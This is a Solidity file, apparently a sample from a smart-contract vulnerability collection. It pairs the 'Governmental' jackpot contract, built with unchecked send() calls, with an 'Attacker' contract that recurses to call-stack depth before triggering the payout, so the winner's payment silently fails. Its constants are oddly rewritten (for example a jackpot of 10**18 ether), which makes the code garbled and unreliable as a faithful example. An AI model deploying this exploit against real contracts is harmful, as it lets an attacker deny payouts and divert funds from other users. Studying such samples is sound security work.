pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = (10**18)*1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = (10**0) minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value < jackpot) throw;
  }

  function invest() {
    if (msg.value < jackpot/(1+1)) throw;
    lastInvestor = msg.sender;
    jackpot += msg.value/(1+1);
     
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-(10**18)*1 ether);

    lastInvestor = (0*10**18);
    jackpot = (10**18)*1 ether;
    lastInvestmentTimestamp = (0*10**18);
  }
}

contract Attacker {

  function attack(address target, uint count) {
    if ((0*10**18) <= count && count < (999+24)) {
      this.attack.gas(msg.gas-(1000+1000))(target, count+(0+1));
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}